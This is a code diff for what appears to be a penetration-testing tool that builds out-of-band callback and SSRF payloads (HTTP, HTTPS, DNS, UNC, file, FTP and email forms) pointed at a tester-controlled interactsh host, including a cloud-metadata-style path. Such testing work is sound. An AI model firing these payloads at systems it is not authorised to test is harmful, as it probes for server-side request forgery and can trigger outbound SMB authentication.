@@ -22,19 +22,24 @@ export const SECTIONS: { id: Section | "metadata" | "gopher" | "xxe" | "xss" | "
   { id: "cmd", label: "Command injection", ready: false },
 ];
 
-// host: the payload host, <id>.<domain>. Plain-HTTP callbacks put the tag (and code) in labels; HTTPS
-// keeps a single label in front of the domain (the certificate is a one-label wildcard), so the tag
-// joins the id with a dash (<tag>-<id>) and the code goes in the path.
-const sub = (code: string, tag: string, host: string) => `${code}.${tag}.${host}`;
+// host: the payload host, <id>.<domain> (the short id once the edge records DNS). The tag joins the id
+// with a dash, <tag>-<id>, in every protocol: one label, so the *.domain certificate covers it over
+// HTTPS too. Plain-HTTP and DNS payloads put the variant code in a label in front; HTTPS can't (that
+// would be two labels), so its code goes in the path.
+export const tagged = (tag: string, host: string) => `${tag}-${host}`;
+// an id for display: the engine's 33 chars as "c0ffee12…", Colluder's short id whole
+export const shownId = (id: string) => (id.length > 12 ? `${id.slice(0, 8)}…` : id);
+const sub = (code: string, tag: string, host: string) => `${code}.${tagged(tag, host)}`;
 
-export function callbacks(tag: string, host: string): Payload[] {
+// mailHost: the engine's long host. SMTP goes straight to interactsh, which only knows that id.
+export function callbacks(tag: string, host: string, mailHost = host): Payload[] {
   const v = (code: string, name: string, text: string, note?: string): Payload => ({ code, section: "callbacks", name, text, note });
   return [
     v("kc1", "HTTP", `http://${sub("kc1", tag, host)}/`, "Also a DNS lookup of the name, so a target that resolves but can't connect still shows up."),
-    v("kc2", "HTTPS", `https://${tag}-${host}/k/kc2`, "Tag joined to the id with a dash, code in the path: one label, so the certificate covers it."),
+    v("kc2", "HTTPS", `https://${tagged(tag, host)}/k/kc2`, "The code goes in the path: in front of the host it would be a second label, which the certificate doesn't cover."),
     v("kc3", "DNS name", sub("kc3", tag, host), "For fields that only take a hostname, or a resolve-only check."),
     v("kc4", "Protocol-relative", `//${sub("kc4", tag, host)}/`, "Takes the scheme of the page or request it lands in."),
-    v("kc5", "Email address", `kc5@${tag}.${host}`, "Delivery arrives as an SMTP hit; the MX lookup comes first as DNS."),
+    v("kc5", "Email address", `kc5@${tagged(tag, mailHost)}`, "Delivery arrives as an SMTP hit; the MX lookup comes first as DNS. Uses the long id: mail goes straight to interactsh."),
     v("kc6", "UNC path", `\\\\${sub("kc6", tag, host)}\\k`, "Windows tries SMB; the lookup of the name shows up as DNS."),
     v("kc7", "file URL (UNC)", `file://${sub("kc7", tag, host)}/k`, "On Windows a file URL with a host goes out over SMB."),
     v("kc8", "FTP", `ftp://${sub("kc8", tag, host)}/k`, "Clients that follow ftp:// show up as at least a DNS lookup."),
@@ -114,7 +119,7 @@ export function ssrfPayloads(tag: string, host: string): Payload[] {
   return [
     v("ks1", "First choice", `http://${sub("ks1", tag, host)}/`, "Use this one first: clients follow http → http redirects most reliably."),
     v("ks2", "Plausible path", `http://${sub("ks2", tag, host)}/latest/meta-data/`, "For filters that want a path that looks like the real thing."),
-    v("ks3", "Over HTTPS", `https://${tag}-${host}/k/ks3`, "Java HttpURLConnection and Ruby open-uri won't follow https → http, so this one can stop at the first hop."),
+    v("ks3", "Over HTTPS", `https://${tagged(tag, host)}/k/ks3`, "Java HttpURLConnection and Ruby open-uri won't follow https → http, so this one can stop at the first hop."),
   ];
 }
 
